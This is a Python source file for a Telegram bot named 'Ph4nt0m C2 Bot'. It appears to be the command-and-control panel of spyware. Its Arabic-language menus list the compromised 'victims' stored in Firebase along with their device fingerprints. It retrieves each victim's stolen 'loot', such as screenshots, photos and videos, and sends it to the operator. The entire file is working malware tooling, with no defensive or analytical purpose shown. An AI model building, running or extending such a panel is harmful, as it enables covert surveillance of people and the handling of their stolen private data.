#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Simple Viewer
"""
import os, json, threading, time, requests, base64
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from firebase_admin import credentials, initialize_app, db

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "System Active"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    flask_app.run(host='0.0.0.0', port=port)

BOT_TOKEN = os.environ["BOT_TOKEN"]
FIREBASE_URL = os.environ["FIREBASE_URL"]
firebase_creds = os.environ.get("FIREBASE_CREDS")
if firebase_creds:
    cred = credentials.Certificate(json.loads(firebase_creds))
    initialize_app(cred, {'databaseURL': FIREBASE_URL})
else:
    initialize_app(options={'databaseURL': FIREBASE_URL})

victims_ref = db.reference('victims')
current_victim = {}

def get_online_victims():
    snap = victims_ref.get()
    if not snap: return {}
    return {k:v for k,v in snap.items() if v.get('online')}

async def send_file(update, data, name, caption):
    try: await update.message.reply_document(document=data, filename=name, caption=caption)
    except: pass

async def show_loot(update, vid):
    loot = db.reference(f'victims/{vid}/loot').get()
    if not loot:
        await update.message.reply_text("لا توجد مسروقات بعد.")
        return
    items = sorted(loot.items(), key=lambda x: x[1].get('ts', 0))[-5:]
    for k, item in items:
        t = item.get('type', '?')
        n = item.get('name', t)
        u = item.get('url')
        if u:
            try:
                r = requests.get(u)
                if r.status_code == 200:
                    ext = 'png' if t in ('screenshot','photo') else 'webm' if t=='video' else 'bin'
                    await send_file(update, r.content, f"{n}.{ext}", f"📎 {n}")
            except: pass

def victims_keyboard():
    kbd = []
    for vid, info in get_online_victims().items():
        fg = info.get('fingerprint', {})
        kbd.append([InlineKeyboardButton(f"🖥 {vid} ({fg.get('plat','?')})", callback_data=f'sel_{vid}')])
    kbd.append([InlineKeyboardButton("🔄 تحديث", callback_data='refresh')])
    return InlineKeyboardMarkup(kbd)

def control_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 عرض المسروقات", callback_data='loot')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back')]
    ])

async def start(update, context):
    await update.message.reply_text("⚡ Ph4nt0m", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("📟 عرض الضحايا", callback_data='list')]
    ]))

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    d = q.data

    if d in ('list', 'back', 'refresh'):
        v = get_online_victims()
        if not v:
            await q.edit_message_text("لا أجهزة", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄", callback_data='refresh')]]))
            return
        await q.edit_message_text("اختر جهاز:", reply_markup=victims_keyboard())
        return
    if d.startswith('sel_'):
        vid = d[4:]
        if vid not in get_online_victims():
            await q.edit_message_text("غير متصل", reply_markup=victims_keyboard())
            return
        current_victim[uid] = vid
        await q.edit_message_text(f"✅ {vid}", reply_markup=control_keyboard())
        return

    vid = current_victim.get(uid)
    if not vid:
        await q.edit_message_text("اختر جهاز", reply_markup=victims_keyboard())
        return
    if d == 'loot':
        await show_loot(q, vid)
        await q.edit_message_text("✅ تم العرض", reply_markup=control_keyboard())

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    print("🤖 Ready")
    app.run_polling()

if __name__=="__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    main()
